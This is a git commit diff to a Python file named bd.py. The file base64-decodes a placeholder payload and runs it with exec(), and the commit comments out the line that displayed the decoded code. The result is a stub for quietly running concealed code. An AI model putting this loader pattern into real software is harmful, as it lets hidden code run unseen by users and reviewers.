f41df78846e1a426537a1605add346cb31b785f6
weasley187 <54782676+weasley187@users.noreply.github.com>
2020-03-31 19:46:52 +0300

    Update bd.py

--- bd.py
+++ bd.py
@@ -7,7 +7,7 @@ xor = b'yourENCODEDpayload'
 def xor_exec():
 	xor_conn = base64.b64decode(xor) 
 	exec(xor_conn.decode('utf-8'))
-	print('{}'.format(xor_conn))
+	#print('{}'.format(xor_conn))
 	return
 
 xor_exec()
